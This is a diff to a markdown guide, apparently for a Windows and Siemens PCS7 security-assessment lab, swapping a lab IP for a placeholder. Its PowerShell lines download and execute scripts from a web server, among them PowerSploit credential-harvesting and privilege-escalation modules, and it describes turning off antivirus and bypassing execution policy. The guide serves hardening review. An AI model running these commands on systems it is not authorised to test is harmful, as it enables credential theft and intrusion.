@@ -20,7 +20,7 @@ Locate PowerShell or Windows Terminal in start menu, hold shift, right click, an
 
 ## Run Chaps 
 
-```IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/chaps/chaps.ps1')```
+```IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/chaps/chaps.ps1')```
 
 
 ## Review CHAPS Tool Output 
@@ -32,7 +32,7 @@ Check the user's AppData temp directory. In a Windows Explorer terminal, type th
 ## Run Trimarc AD Script. 
 See: [Trimarc: Securing Active Directory: Performing an Active Directory Security Review](https://www.hub.trimarcsecurity.com/post/securing-active-directory-performing-an-active-directory-security-review)
 
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/TrimarcAD/Invoke-TrimarcADChecks.ps1')
+```IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/TrimarcAD/Invoke-TrimarcADChecks.ps1')```
 
 # Run Third-Party OS Hardening Evaluation Scripts
 ## Review Tool output 
@@ -41,7 +41,7 @@ c:\temp\Trimarc-ADReports
 ## Run Otorio PCS7 Hardening. 
 See [Otorio: Siemens Simatic PCS 7 Hardening Tool](https://github.com/otoriocyber/PCS7-Hardening-Tool). Output is written to the screen.
 
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/Otorio/PCS7-Hardening-Tool/PCS7Hardening.ps1')
+```IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/Otorio/PCS7-Hardening-Tool/PCS7Hardening.ps1')```
 
 # Run CHAPS-PowerSploit - **AV TRIGGER**
 **BEWARE** The following steps will trigger AV and block the scripts from running unless it is disabled. The following steps do not permanently disable Windows Defender. However, if not set back, the settings will not revert until the system is rebooted. **BEWARE**
@@ -55,15 +55,15 @@ From an Administrator PowerShell or WindowsTerminal, start Powershell for user w
 
 ```runas /user:student 'powershell.exe -exec bypass'```
 
-## Run Chaps Powersploit 
+## Run Chaps PowerSploit 
 
 ```
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/PowerSploit/Recon/PowerView.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/PowerSploit/Exfiltration/Get-GPPPassword.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/PowerSploit/Exfiltration/Get-GPPAutologon.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/PowerSploit/Exfiltration/Get-VaultCredential.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/PowerSploit/Privesc/PowerUp.ps1')
-IEX (New-Object Net.WebClient).DownloadString('http://192.168.139.4:8181/chaps/chaps-powersploit.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/PowerSploit/Recon/PowerView.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/PowerSploit/Exfiltration/Get-GPPPassword.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/PowerSploit/Exfiltration/Get-GPPAutologon.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/PowerSploit/Exfiltration/Get-VaultCredential.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/PowerSploit/Privesc/PowerUp.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://<web server IP>:8181/chaps/chaps-powersploit.ps1')
 
 ```
 
